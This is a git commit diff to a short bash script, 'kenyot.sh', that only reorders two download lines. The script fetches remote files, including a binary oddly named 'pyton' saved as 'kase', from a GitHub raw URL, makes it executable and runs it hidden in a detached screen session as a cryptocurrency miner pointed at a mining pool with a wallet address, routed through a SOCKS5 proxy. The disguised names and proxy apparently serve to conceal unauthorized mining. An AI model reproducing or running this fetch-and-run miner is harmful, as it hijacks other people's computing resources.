1a5e2931bff7c7d54c407652e855a0b3691c866a
hndouehdw <95325562+hndouehdw@users.noreply.github.com>
2021-12-09 01:51:12 +0700

    Update kenyot.sh

--- kenyot.sh
+++ kenyot.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 apt-get install screen -y
-wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
 wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/compile.sh
+wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
 chmod +x kase
 screen -dm -S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://54.163.208.195:3129
 chmod +x compile.sh
